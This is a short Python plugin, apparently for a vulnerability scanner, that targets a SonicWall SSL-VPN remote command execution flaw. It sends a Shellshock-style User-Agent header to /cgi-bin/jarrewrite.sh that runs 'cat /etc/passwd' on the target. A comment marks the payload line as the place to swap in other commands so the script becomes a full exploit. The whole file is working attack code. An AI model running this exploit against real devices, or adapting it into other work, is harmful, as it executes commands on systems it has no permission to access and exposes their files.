#coding:utf-8
import requests
import requests.packages.urllib3
requests.packages.urllib3.disable_warnings()

def msg():
  ret = {

      'links'     :  '',

      'huixian'   :  '该脚本可修改为exp',

      'method'    :   'get',

      'bugname'   :   'SonicWall SSL-VPN 远程命令执行漏洞',

      'level'     :   'high',

      'FOFA'      :   '',

      'author'    :   'ppxfx',

      'ifbug'     :   False,
  }
  return ret

def run(url,ua):
  ret = msg()
  payload = 'cat /etc/passwd'#exp修改处
  headers = {"User-Agent": "() { :; }; echo ; /bin/bash -c '%s'" % (payload)}
  target = '/cgi-bin/jarrewrite.sh'
  url1 = url + target
  ret['url'] = url1
  try:
    res=requests.get(url=url1,headers=headers,timeout=5,verify=False)
    if res.status_code == 200 and "root:" in res.text:
      # ret['huixian'] = res.text
      res.close()
      ret['ifbug'] = True
      return ret
    else:
      return ret
  except:
    return ret